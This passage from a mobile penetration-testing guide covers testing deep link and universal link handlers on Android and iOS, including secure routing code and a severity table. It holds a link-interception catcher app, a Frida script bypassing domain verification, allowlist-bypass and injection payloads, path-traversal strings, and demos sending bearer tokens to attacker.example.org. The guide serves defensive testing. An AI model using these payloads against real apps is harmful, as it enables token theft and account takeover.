        let allowed = allowedSources.contains(source)                 // nil -> "(none)" -> rejected
        // … only proceeds when allowed
    }
}
```

The r2 script finds a `sourceApplication` access in each path:

```text
=== Cross-references to sourceApplication from handler ===
sym.MASTestApp.SceneDelegate.scene.allocator.willConnectTo.options 0x100004c8c [DATA:r--] ldr x1, reloc.fixup.sourceApplication
sym.MASTestApp.SceneDelegate.scene.allocator.openURLContexts...    0x1000051a8 [DATA:r--] ldr x1, reloc.fixup.sourceApplication
```

Each site loads the selector, calls `objc_msgSend`, bridges the result to a Swift `String`, and branches with `cbz` when it is `nil`. Launching `mastgtest://transfer?amount=9999999` from `devicectl` (not a same-team app) yields `Source app: (none)` and `Handler returned: false`. The test passes. Note that the demo's handler still never validates `amount`; in a real app that would be a MASTG-TEST-0370 finding for requests from allowlisted sources.

### MASTG-TEST-0395: Missing Input Validation in Universal Link Handlers (iOS)

Source: [MASTG-TEST-0395](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0395/). Platform: iOS. Type: static (code) with manual review. Knowledge: MASTG-KNOW-0080. Best practice: MASTG-BEST-0072. APIs: `continueUserActivity`, `webpageURL`, `NSUserActivityTypeBrowsingWeb`, `URLComponents`, `URLQueryItem`.

#### Overview

Universal links fix who receives a link; they do not fix what is in it. iOS checks the domain against the AASA file, then hands the full `webpageURL` to the app, with a path and query anyone can write. This test checks that the handler validates them. Besides the scheme examples, OWASP adds the one that matters most for universal links: `https://example.com/showPage?page=https://attacker.example.org` loaded in a WebView or used as a request target.

#### Prerequisites

- The decrypted bundle and r2/rabin2, as for MASTG-TEST-0370.
- The app's entitlements ([MASTG-TECH-0111](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0111/)) and access to the associated domains' AASA files ([MASTG-TECH-0175](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0175/)).
- A device with Developer Mode, Notes, and `devicectl`; Frida for triggering the handler when the domain does not verify on your device ([MASTG-TECH-0169](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0169/), [MASTG-TECH-0176](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0176/)).

#### Steps

1. **List associated domains** from the entitlements (`rabin2 -OC`, `codesign -d --entitlements -` or `ldid -e`) and fetch each AASA file, both from the domain and from Apple's CDN (what devices actually get):

   ```bash
   curl -sv https://example.com/.well-known/apple-app-site-association 2>&1 | grep -E '^< (HTTP|content-type|location)'
   curl -s https://example.com/.well-known/apple-app-site-association | python3 -m json.tool
   curl -s https://app-site-association.cdn-apple.com/a/v1/example.com | python3 -m json.tool
   ```

   Check that `appIDs` contains the app's `application-identifier` from the entitlements, and note which paths the `components` route to the app. On a Mac, `sudo swcutil dl -d example.com` downloads through the CDN and `sudo swcutil verify -d example.com -j aasa.json -u https://example.com/app/x` tells you whether a URL matches. Every routed path is input to the handler.

2. **Find the handler:** `application:continueUserActivity:restorationHandler:` or `scene:continueUserActivity:` (Objective-C selectors), `onContinueUserActivity` (SwiftUI symbol), and `webpageURL`:

   ```bash
   r2 -qc 'aaa; f~continueUserActivity' Payload/App.app/App
   r2 -qc 'aaa; f~onContinueUserActivity' Payload/App.app/App
   r2 -qc 'aaa; f~webpageURL' Payload/App.app/App
   ```

   Check that the handler compares `activityType` with `NSUserActivityTypeBrowsingWeb` before reading `webpageURL`, then follow `URL.path`, `pathComponents` and query items to their sinks, as in MASTG-TEST-0370.

3. **Trace a live link** with `frida-trace -U <App> -m "*[* *continueUserActivity*]"` and edit the generated handler to log `activityType` and `webpageURL` (MASTG-TECH-0176). Add `-i "*open*Url*"` to see whether the handler forwards the URL to an open call or a WebView.

4. **Fire crafted links.** If the domain verifies on your device, paste the links into Notes and long-press › *Open in "App"*, or use `devicectl --payload-url 'https://example.com/…'`; the Developer settings *Diagnostics* screen tells you whether a URL is a valid universal link for an installed app. If it does not verify (a staging build, a domain your device cannot reach), deliver an `NSUserActivity` directly with Frida:

   ```javascript
   // ul.js — deliver a universal link straight to the scene delegate (bypasses domain verification)
   function triggerUniversalLink(urlString) {
     const activity = ObjC.classes.NSUserActivity.alloc()
       .initWithActivityType_('NSUserActivityTypeBrowsingWeb');
     activity.setWebpageURL_(ObjC.classes.NSURL.URLWithString_(urlString));
     const scenes = ObjC.classes.UIApplication.sharedApplication().connectedScenes().allObjects();
     for (let i = 0; i < scenes.count(); i++) {
       const scene = scenes.objectAtIndex_(i);
       const d = scene.delegate();
       if (d !== null && d.respondsToSelector_(ObjC.selector('scene:continueUserActivity:'))) {
         ObjC.schedule(ObjC.mainQueue, () => d.scene_continueUserActivity_(scene, activity));
         return true;
       }
     }
     return false;
   }
   triggerUniversalLink('https://example.com/app/transfer?amount=9999999');
   ```

   For apps with only an app delegate, call `application:continueUserActivity:restorationHandler:` on `UIApplication.sharedApplication().delegate()` instead. This tests the handler's logic only; it does not prove that a real tap reaches it, so record which method you used.

#### Observation

The associated domains, AASA content (from the domain and from the CDN) and routed paths; the handler disassembly or source from `webpageURL` to each sink; the trace output; the crafted links, how each was delivered, and the result.

#### Evaluation

The test **fails** if the universal link handler uses path or query values in a security-relevant operation without adequate validation: missing type conversion, missing bounds checks, no sanitisation before a file path, query or WebView, or no allowlist where the path or a parameter selects a resource, host or action. It **passes** if the handler checks the activity type, parses `webpageURL` with `URLComponents`, allowlists the paths it handles, converts and bounds every parameter, and discards everything else. Free-form values reaching harmless sinks are out of scope.

#### Demo

[MASTG-DEMO-0153](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0153/MASTG-DEMO-0153/). The app declares `applinks:demo.mas.owasp.org` and reads `amount` from `/transfer` links:

```swift
.onContinueUserActivity(NSUserActivityTypeBrowsingWeb) { activity in
    UniversalLinkState.lastActivity = activity
}

// FAIL: [MASTG-TEST-0395] path is checked, "amount" is not
guard userActivity.activityType == NSUserActivityTypeBrowsingWeb,
      let url = userActivity.webpageURL,
      let components = URLComponents(url: url, resolvingAgainstBaseURL: true) else { … }
if url.path == "/transfer" {
    let amount = components.queryItems?.first(where: { $0.name == "amount" })?.value ?? "0"
    completion("Transferring \(amount) units")
}
```

The demo extracts the entitlements with `rabin2 -OC` (confirming `applinks:demo.mas.owasp.org`), then the r2 script shows `handleUniversalLink`, an empty `Int_init` section, the `onContinueUserActivity` registration and the `webpageURL` reference. The disassembly runs `URLComponents.init` (`0x1000069ac`), `URL.path` compared with `"/transfer"` (`0x100006a44`, `0x100006a5c`), `URLQueryItem.value` (`0x100006bc4`) and `DefaultStringInterpolation` (`0x100006cd0`) with no conversion in between. Because the demo domain has no AASA file for the app, OWASP triggers the handler with a constructed `NSUserActivity` (the Frida approach above); `https://demo.mas.owasp.org/transfer?amount=9999999` returns `Transferring 9999999 units`. The test fails.

### GT-0029-1: Link hijacking with a competing handler (Android and iOS)

Guler Tech methodology. Platform: Android and iOS. Type: dynamic. Covers MAS-ATTACK-0046, which the OWASP tests reason about but do not exercise.

#### Overview

The check proves, with a test app you control, whether another app on the device can receive links meant for the target app, and what those links carry. It turns "custom scheme for OAuth" or "App Link not verified" from a configuration observation into a demonstrated interception, and it tells you what the attacker gets.

#### Prerequisites

- The deep link inventory and, from MASTG-TEST-0393, the verification state of each web link.
- A list of the flows that produce links *to* the app: login and OAuth redirects, email verification, magic links, password reset, invitations, payment provider callbacks, SSO from another app. Trigger each once on a test account and note the full URL it delivers (Frida trace from MASTG-TEST-0394/0395, or the proxy for redirects).
- Android Studio or Xcode to build a small catcher app; an Android 11 (API 30) emulator in addition to a current device, because the chooser behaviour for unverified web links differs.

#### Steps

1. **Build a catcher.** On Android, declare the target's scheme (or unverified host) and log whatever arrives, then forward it so the victim notices nothing:

   ```xml
   <queries><package android:name="com.example.app" /></queries>
   <application android:label="Example App">
       <activity android:name=".Catcher" android:exported="true"
                 android:theme="@android:style/Theme.Translucent.NoTitleBar">
           <intent-filter>
               <action android:name="android.intent.action.VIEW" />
               <category android:name="android.intent.category.DEFAULT" />
               <category android:name="android.intent.category.BROWSABLE" />
               <data android:scheme="myapp" android:host="oauth" />
           </intent-filter>
       </activity>
   </application>
   ```

   ```kotlin
   class Catcher : Activity() {
       override fun onCreate(savedInstanceState: Bundle?) {
           super.onCreate(savedInstanceState)
           Log.w("CATCHER", "intercepted: ${intent.dataString} extras=${intent.extras?.keySet()}")
           // Forward to the real app so the flow continues (an attacker would first redeem the code)
           startActivity(Intent(intent).setComponent(null).setPackage("com.example.app"))
           finish()
       }
   }
   ```

   On iOS, create an app with the same entry in `CFBundleURLTypes` and log the URL in `scene(_:openURLContexts:)` or `.onOpenURL`; install it on the simulator or a development device next to the target.

2. **Run each flow** from step 2 of the prerequisites with the catcher installed. On Android, record whether a chooser appears, which entries it lists, and what happens if the user picks the catcher (including "Always"). Repeat the web-link cases on the Android 11 emulator and on Android 12+; on 12+, also test the user-approval route (*Settings › Apps › Catcher › Open by default › Add link*) to show what a social-engineered user would enable. On iOS, record which app receives the URL; repeat after reinstalling the apps in the opposite order, since the outcome is undefined.

3. **Look at what was intercepted.** `adb logcat -s CATCHER` (or the iOS app's log). For OAuth, check whether the code can be redeemed without the PKCE `code_verifier`: replay it to the token endpoint from the proxy. If the authorisation server requires PKCE and the app uses it, the stolen code is useless and the impact drops to phishing; the details of the OAuth side belong to the [MASVS-AUTH guide](/mobile/masvs-auth-authentication-guide/).

4. **Check the cases that are not hijackable.** Verified App Links and universal links should never reach the catcher; on iOS, OAuth flows run with `ASWebAuthenticationSession` deliver their callback to the session's completion handler rather than through general URL routing, so a catcher with the same scheme should not see them either. Confirm, and note which flows are protected and why.

#### Observation

For each flow: the URL delivered, the link type and verification state, whether the catcher received it (with a screenshot of the chooser where there was one), what it contained, and whether the intercepted value could be used (token replay, code redemption).

#### Evaluation

The check **fails** if a link that carries authentication material (OAuth code without enforced PKCE, session or refresh token, magic-login or reset token, verification code) or sensitive personal data can be received by the catcher, with or without a user choice in a chooser. It also fails, at lower severity, if a link that triggers a flow the user trusts (a payment callback, an invitation) can be received and spoofed back. It **passes** if sensitive links only travel over verified App Links or universal links (or an `ASWebAuthenticationSession` callback), and custom schemes carry nothing an interceptor could use.

#### Demo

An app uses `myapp://oauth/callback` as its OAuth redirect without PKCE. With the catcher above installed on an Android 12 device, the redirect after login shows a chooser listing "Example App" twice; picking the catcher logs:

```text
W CATCHER : intercepted: myapp://oauth/callback?code=TEST-AUTH-CODE&state=f1c2 extras=null
```

The code redeems at the token endpoint without a `code_verifier`, so the catcher could have logged in as the user. Fix: PKCE enforced by the server, and an `https` redirect on a verified App Link, as described in the AUTH guide.

### GT-0029-2: Exploiting unvalidated deep link input (Android and iOS)

Guler Tech methodology. Platform: Android and iOS. Type: dynamic, guided by the static findings of MASTG-TEST-0394, 0370 and 0395. Covers MAS-ATTACK-0047.

#### Overview

The OWASP input-validation tests stop at "the value is used without validation". This check takes each such value to its sink and tries the exploit patterns we see most often in deep link handlers, so that the finding can be rated on demonstrated impact. Several patterns end in a sibling weakness; we prove the link part here and point to the sibling note for the sink.

#### Prerequisites

- The handler review from MASTG-TEST-0394 / 0370 / 0395 with each parameter's sink.
- The firing methods and the crafted web page from [Before you start](#before-you-start-enumerating-and-firing-every-deep-link); an intercepting proxy ([traffic interception lab](/mobile/mobile-traffic-interception-lab/)); a host you control (`attacker.example.org` below); Chrome remote debugging (`chrome://inspect`) for Android WebViews and Safari's Develop menu for iOS WebViews, where the app allows inspection.

#### Steps

1. **WebView loads a link-supplied URL** ([MASWE-0035](/mobile/maswe-0035-webviews-loading-untrusted-content/)). Give the parameter your own page and the usual allowlist bypasses:

   ```text
   myapp://web?url=https://attacker.example.org/
   myapp://web?url=https://example.com.attacker.example.org/
   myapp://web?url=https://attacker.example.org/?https://example.com/
   myapp://web?url=https://example.com@attacker.example.org/
   myapp://web?url=https://attacker.example.org%2F%40example.com/
   myapp://web?url=javascript:alert(document.domain)
   myapp://web?url=file:///data/data/com.example.app/shared_prefs/
   https://example.com/app/help?page=https%3A%2F%2Fattacker.example.org%2F
   ```

   Percent-encode the inner URL when the parameter is itself in a query (`url=https%3A%2F%2F…`). If your page loads: check what it can reach. Does the request to your host carry an `Authorization` header or session cookie (`loadUrl(url, headers)` with the token, shared cookie jar)? Is a JavaScript bridge present (`typeof Android`, `window.webkit.messageHandlers`) ([MASWE-0033](/mobile/maswe-0033-sensitive-native-functionality-exposed-in-webviews/))? Does `file://` work ([MASWE-0034](/mobile/maswe-0034-webviews-allow-access-to-local-resources/))? Is there an address bar, or does the page look like the app?

2. **External open and intent redirection.** Parameters passed to `startActivity(Intent(ACTION_VIEW, Uri.parse(x)))`, `UIApplication.shared.open(x)` or `SFSafariViewController` make the app an open redirector with the app's name on it (useful for phishing and for bouncing through allowlists elsewhere). On Android, look harder at `Intent.parseUri(x, Intent.URI_INTENT_SCHEME)`: a link like `myapp://open?next=intent:%23Intent;component=com.example.app/.internal.AdminActivity;end` can start a non-exported activity with the app's own identity, which is intent redirection ([MASWE-0032](/mobile/maswe-0032-insecure-intents/)).

3. **State change on arrival (CSRF-like).** For each route that changes state (follow, like, accept invitation, add payee, link device, change e-mail or setting, start a payment), open it from the crafted web page while logged in and watch the proxy. A request to the backend without any in-app confirmation is the finding; whether a session or PIN was required is the MASWE-0018 question ([GT-0018-7](/mobile/maswe-0018-missing-auth-on-app-components/) for iOS). Include the locked state: does the route bypass the app's own lock screen?

4. **Data sent to an attacker-chosen place.** Parameters named `callback`, `return_url`, `webhook`, `share_to`, `export`, and especially configuration switches (`env`, `api`, `server`, `baseUrl`, `debug`) left over from QA: `myapp://config?api=https://attacker.example.org/` that re-points the API client sends every subsequent request, token included, to your host. Search for them in the strings dump and in `deeplink-trace.js` output.

5. **Files and paths.** Values used to build file paths, content URIs or share intents: `..%2F..%2Fshared_prefs%2Fauth.xml`, absolute paths, `content://` URIs of the app's own providers. Success is the app displaying, uploading or sharing a file it should not.

6. **Injection into interpreters.** Values concatenated into `evaluateJavascript("show('" + name + "')")` / `evaluateJavaScript`, SQL (`rawQuery`), `NSPredicate(format:)` strings, templating or expression engines (the CWE-917 case), or HTML rendered with `Html.fromHtml` / `NSAttributedString` from HTML. Use a payload that proves execution without harm (`');alert(1);//`, `' OR '1'='1`).

7. **Spoofed results.** Callback routes that the app believes, such as `myapp://payment/result?status=success&order=123`: fire one for an unpaid order and check whether the app (and, more importantly, the backend) marks it paid.

#### Observation

For each parameter and pattern: the link, how it was delivered (adb/devicectl/web page), screenshots, proxy entries (requests to `attacker.example.org`, state-changing API calls), WebView inspector output, and the code location of the sink.

#### Evaluation

The check **fails** for each pattern that works: an attacker page loads in the app's WebView, an external open or intent redirection occurs with attacker-chosen targets, a state-changing request is sent without in-app confirmation, data or tokens reach an attacker-chosen host, a private file is exposed, injected code or queries execute, or a spoofed callback changes the app's or the server's state. It **passes** when the handler rejects or neutralises every payload: the parameter is ignored, the link opens a safe screen, or the app asks the user and the server re-checks. Rate each success on its own sink (see [Rating findings](#rating-findings)).

#### Demo

A help-centre router that tries to restrict URLs with a prefix check:

```kotlin
override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    val target = intent.data?.getQueryParameter("url") ?: return finish()
    if (target.startsWith("https://example.com")) {               // bypassable
        webView.settings.javaScriptEnabled = true
        webView.addJavascriptInterface(NativeBridge(this), "Native")
        webView.loadUrl(target, mapOf("Authorization" to "Bearer ${session.token}"))
    }
}
```

```bash
adb shell "am start -W -a android.intent.action.VIEW -d 'myapp://help?url=https%3A%2F%2Fexample.com.attacker.example.org%2Fx.html' com.example.app"
```

`https://example.com.attacker.example.org/x.html` passes the prefix check, the proxy shows the request to the attacker host with `Authorization: Bearer …`, and the page can call `Native.*`. Delivered from a web page with one tap, that is token theft and bridge access (Critical). The fix compares `Uri.parse(target).host` against an exact allowlist, requires `https`, never attaches credentials to WebView loads of link-supplied URLs, and keeps the bridge off WebViews that can load them.

## Best practices

OWASP links six best practices to these tests. We summarise each with what we check for in review, then give our own handler patterns for both platforms.

### MASTG-BEST-0070: Verify Android App Links with autoVerify and Digital Asset Links

Source: [MASTG-BEST-0070](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0070/). Platform: Android (API 23+).

Put `android:autoVerify="true"` on every filter that declares an `http`/`https` link, include `BROWSABLE` and the `https` scheme, and publish `/.well-known/assetlinks.json` on **every** declared host (and on the root domain for wildcard hosts), over HTTPS, without redirects, listing the package name and the fingerprint of the key the installed app is signed with. Confirm with `adb shell pm get-app-links <package>` after installing a release build, and add that check to your release process, because the website side can break verification at any time (a CDN rule, a new redirect, a key rotation). Keep verified filters free of custom schemes and of hosts you cannot verify, which matters on Android 11 and lower where one failure voids all. Do not rely on custom schemes for anything sensitive; if you must accept one, treat its input as in MASTG-BEST-0071.

### MASTG-BEST-0071: Validate Input Parameters in Deep Link and Custom URL Scheme Handlers

Source: [MASTG-BEST-0071](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0071/). Platform: Android.

Treat everything from `Intent.getData()`, `Uri.getQueryParameter()`, `getPathSegments()` and `getLastPathSegment()` (and intent extras) as untrusted. Convert numbers with `toLongOrNull()`/`toIntOrNull()` and reject failures; enforce minimum and maximum bounds; canonicalise file paths and check they stay inside the intended directory; never put values into SQL or shell strings; prefer allowlists for anything that selects a resource or an action, and reject non-matching values instead of trying to strip characters. Set `android:exported="false"` on activities that do not have to be reached from outside, and prefer verified App Links over custom schemes for sensitive links.

```kotlin
val amount = uri.getQueryParameter("amount")?.toLongOrNull() ?: return reject()
if (amount <= 0 || amount > 10_000) return reject()
```

### MASTG-BEST-0054: Validate Input Parameters in Custom URL Scheme Handlers

Source: [MASTG-BEST-0054](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0054/). Platform: iOS.

The iOS equivalent: convert with `Int.init`/`Double.init` and handle failure, check bounds, resolve paths with `URL.standardized` and verify they stay under the base directory, never interpolate values into predicates, SQL or JavaScript, and allowlist known values.

```swift
guard let raw = components?.queryItems?.first(where: { $0.name == "amount" })?.value,
      let amount = Int(raw), amount > 0, amount <= 10_000 else { return }
```

One refinement: `URL.standardized` removes `..` segments lexically but does not resolve symbolic links; for paths that end up in file APIs, also compare `resolvingSymlinksInPath()` results, or better, map the parameter to a fixed set of file names instead of accepting paths at all.

### MASTG-BEST-0055: Validate Source Application in Custom URL Scheme Handlers

Source: [MASTG-BEST-0055](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0055/). Platform: iOS.

When a scheme triggers something privileged that only your own apps should trigger, read `UIOpenURLContext.options.sourceApplication` and compare it against an allowlist of your own bundle IDs, on both the cold-launch path (`scene(_:willConnectTo:options:)`) and the warm path (`scene(_:openURLContexts:)`). Apple only fills the value for apps of the same developer team; everything else is `nil`, so `nil` must mean "reject". Pure SwiftUI `.onOpenURL` cannot see the source; use a scene delegate if you need this check.

```swift
let allowedSources: Set<String> = ["com.example.myapp", "com.example.companion"]
guard let source = context.options.sourceApplication, allowedSources.contains(source) else { return }
```

### MASTG-BEST-0072: Validate Input Parameters in Universal Link Handlers

Source: [MASTG-BEST-0072](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0072/). Platform: iOS.

Verification covers the domain only. In the handler, check `activityType == NSUserActivityTypeBrowsingWeb`, read `webpageURL`, parse it with `URLComponents`, allowlist the paths you handle, convert and bound each query value, and apply the same path and injection rules as BEST-0054, on every delivery path (`application(_:continue:restorationHandler:)`, `scene(_:continue:)`, cold-launch `userActivities`, `.onContinueUserActivity`). Apple's own guidance is the same: universal links are an entry point, validate all parameters, discard malformed URLs, and limit what a link can do to actions that do not put the user's data at risk.

### MASTG-BEST-0045: Limit Sensitive Data Exposure Through iOS IPC Channels

Source: [MASTG-BEST-0045](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0045/). Platform: iOS. This page covers all iOS IPC channels; the part relevant here is about URL-based interfaces.

Do not put long-lived secrets, tokens, credentials or personal data in custom-scheme URLs or universal links, whether the app receives them or sends them to other apps with `open(_:options:completionHandler:)`. Send a one-time, short-lived reference instead and have the receiver redeem it over an authenticated channel. Validate all inbound IPC data, reject unexpected schemes, hosts and parameter combinations, and enforce authorisation in the handler, not only in the normal UI. The same rule applies on Android, where links travel through the same logs, histories and chooser dialogs.

### Secure handler patterns (Guler Tech)

Three rules cover most of what goes wrong: **one router, allowlist everything, navigate instead of act.**

**Android.** Route every deep link through one activity that validates and dispatches, on both `onCreate()` and `onNewIntent()`:

```kotlin
class LinkRouterActivity : Activity() {
    private val hosts = setOf("example.com", "www.example.com")
    private val payeeId = Regex("^[A-Z0-9]{8,16}$")

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        route(intent?.data)
        finish()
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        route(intent.data)
        finish()
    }

    private fun route(uri: Uri?) {
        if (uri == null || uri.scheme != "https" || uri.userInfo != null ||
            uri.host?.lowercase() !in hosts) return
        when (uri.path) {
            "/app/transfer" -> {
                val amount = uri.getQueryParameter("amount")?.toLongOrNull()?.takeIf { it in 1..10_000 } ?: return
                val payee = uri.getQueryParameter("to")?.takeIf { payeeId.matches(it) } ?: return
                // Navigate only: the form requires the session, shows the details and asks for confirmation
                startActivity(TransferFormActivity.intent(this, payee, amount))
            }
            "/app/article" -> {
                val id = uri.getQueryParameter("id")?.toIntOrNull() ?: return
                startActivity(ArticleActivity.intent(this, id))      // native screen, not a URL load
            }
            else -> Unit                                              // unknown route: open the home screen at most
        }
    }
}
```

If a link must open web content, map it to known pages (`"/app/help/billing"` → a fixed URL) rather than passing a URL through. If a URL parameter is unavoidable, validate the parsed host exactly:

```kotlin
fun isAllowedWebUrl(raw: String?): Boolean {
    val u = raw?.let(Uri::parse) ?: return false
    return u.scheme == "https" && u.userInfo == null && u.port in setOf(-1, 443) &&
        u.host?.lowercase() in setOf("help.example.com")
}
```

and load it in a WebView without a JavaScript bridge and without credentials in the request (see [MASWE-0035](/mobile/maswe-0035-webviews-loading-untrusted-content/)). Never call `Intent.parseUri()` on link input.

**iOS.** The same router, called from every entry point (scheme and universal link, cold and warm):

```swift
enum LinkRouter {
    static let hosts: Set<String> = ["example.com", "www.example.com"]

    static func route(_ url: URL, coordinator: AppCoordinator) -> Bool {
        guard let c = URLComponents(url: url, resolvingAgainstBaseURL: false),
              c.scheme == "https", c.user == nil,
              let host = c.host?.lowercased(), hosts.contains(host) else { return false }
        let items = c.queryItems ?? []
        func value(_ name: String) -> String? { items.first(where: { $0.name == name })?.value }

        switch c.path {
        case "/app/transfer":
            guard let raw = value("amount"), let amount = Int(raw), (1...10_000).contains(amount),
                  let payee = value("to"), payee.range(of: "^[A-Z0-9]{8,16}$", options: .regularExpression) != nil
            else { return false }
            coordinator.showTransferForm(payee: payee, amount: amount)   // authenticated, confirmed in-app
            return true
        default:
            return false
        }
    }
}

// SceneDelegate
func scene(_ scene: UIScene, continue userActivity: NSUserActivity) {
    guard userActivity.activityType == NSUserActivityTypeBrowsingWeb,
          let url = userActivity.webpageURL else { return }
    _ = LinkRouter.route(url, coordinator: coordinator)
}
```

**Links that carry secrets.** For login, verification and reset links: single use, short expiry (minutes), bound server-side to the session or device that requested them where the flow allows, and redeemed by the app over its authenticated API rather than trusted on arrival. For OAuth: authorisation code flow with PKCE, a claimed `https` redirect (App Links / universal links) or an `ASWebAuthenticationSession` callback, and the server enforcing PKCE; see the [MASVS-AUTH guide](/mobile/masvs-auth-authentication-guide/).

**Callbacks.** Never trust a status in a link (`status=success`). Use the link only as a signal to ask the backend for the real state.

## Rating findings

Rate on four things: **what the link carries or triggers** (authentication material, money movement, account or security changes, personal data, or plain navigation), **the attacker's position** (a malicious app installed on the device with no special permissions; a web page, message or QR code the user taps once; nothing at all), **how much user interaction is needed** (one tap on a link; a choice in a chooser; approving the attacker app for a domain in settings), and **which OS versions are affected** (the Android 12 web-intent change and App Link verification remove most hijacking of `https` links on current devices; custom schemes are hijackable on every version). A malicious app needs no permissions to claim a scheme or send an intent to an exported activity, but on Android 10+ it has to be in the foreground to launch your activity, which usually means the user opened it. A remote attacker with a web page reaches every `BROWSABLE` handler with one tap.

| Rating | Conditions |
|---|---|
| **Critical** | Authentication material (OAuth code without enforced PKCE, session or refresh token, magic-login or reset token) delivered over a claimable link (custom scheme, or a web link that is unverified on supported Android versions), shown interceptable with GT-0029-1, leading to account takeover. Or a link from a web page (one tap) that reaches code execution or credentials: a link-supplied URL loaded in a WebView with a privileged JavaScript bridge or with the user's token attached, an API base-URL switch in production, intent redirection to components that grant access to private data. |
| **High** | A one-tap link that performs a sensitive state change without in-app confirmation (payment, payee, device linking, security setting, e-mail change), or bypasses the app's lock screen; attacker content loaded in the app's WebView in an authenticated context or without an address bar (convincing in-app phishing); private files exposed or shared through a path parameter; SQL or script injection through a link; spoofed payment or verification callbacks that change server-side state. Sensitive personal data carried over a claimable link. |
| **Medium** | Unvalidated parameters causing business-logic bypasses that the server still blocks, or injection into native UI (spoofed text, HTML in labels); open redirect through the app to arbitrary sites; App Links that are not verified (missing `autoVerify` or failing `assetlinks.json`) or universal links that do not verify, on links carrying non-secret but personal identifiers; OAuth over a custom scheme with PKCE enforced (residual phishing and denial of the login); a privileged same-suite scheme without the `sourceApplication` check (MASTG-TEST-0371) where the action still requires in-app confirmation. |
| **Low** | Unverified App Links for links that carry nothing sensitive and only navigate; missing validation where the only demonstrated effect is a crash or an error screen; a custom scheme used for sensitive flows in code that is unreachable in the release build; `mode=developer` associated domains or debug routes present but inert in production. |
| **Info** | Custom schemes used only for navigation and SDK callbacks that carry no secrets; minor deviations from best practice (validation present but implemented as a blocklist with no known bypass; a router that ignores unknown parameters but logs them); verification correct but monitoring of `assetlinks.json` / AASA availability missing. |

Raise a level when the link is sent by the service itself to many users (every password-reset e-mail goes over the claimable link), or when the affected flow belongs to a high-value user base (banking, health, government identity, the EUDIW profile). Lower a level when the attacker needs the user to make an unusual choice (approving a strange app for a domain in Android settings), but not below Medium for interception of authentication material. In the report give the exact link, the delivery method that worked (adb or devicectl for local proof, the web page for remote proof), the OS versions tested, the handler's class and method (or function and address), the sink, and the fix at the source.

## References

- OWASP MASWE: [MASWE-0029: Insecure Deep Links](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0029/); related [MASWE-0018](https://mas.owasp.org/MASWE/MASVS-AUTH/MASWE-0018/), [MASWE-0032](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0032/), [MASWE-0033](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0033/), [MASWE-0034](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0034/), [MASWE-0035](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0035/) (CC BY-SA 4.0)
- OWASP MASVS: [MASVS-PLATFORM-1](https://mas.owasp.org/MASVS/controls/MASVS-PLATFORM-1/), [MASVS-STORAGE-2](https://mas.owasp.org/MASVS/controls/MASVS-STORAGE-2/), [MASVS-CODE-4](https://mas.owasp.org/MASVS/controls/MASVS-CODE-4/) (CC BY-SA 4.0)
- OWASP MASTG knowledge: [MASTG-KNOW-0019: Deep Links](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0019/), [MASTG-KNOW-0079: Custom URL Schemes](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0079/), [MASTG-KNOW-0080: Universal Links](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0080/) (CC BY-SA 4.0)
- OWASP MASTG tests: [MASTG-TEST-0393](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0393/), [MASTG-TEST-0394](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0394/), [MASTG-TEST-0370](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0370/), [MASTG-TEST-0371](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0371/), [MASTG-TEST-0395](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0395/); legacy [MASTG-TEST-0028](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0028/), [MASTG-TEST-0070](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0070/), [MASTG-TEST-0075](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/) (CC BY-SA 4.0)
- OWASP MASTG demos: [MASTG-DEMO-0151](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0151/MASTG-DEMO-0151/), [MASTG-DEMO-0152](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0152/MASTG-DEMO-0152/), [MASTG-DEMO-0134](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0134/MASTG-DEMO-0134/), [MASTG-DEMO-0135](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0135/MASTG-DEMO-0135/), [MASTG-DEMO-0153](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0153/MASTG-DEMO-0153/) (CC BY-SA 4.0)
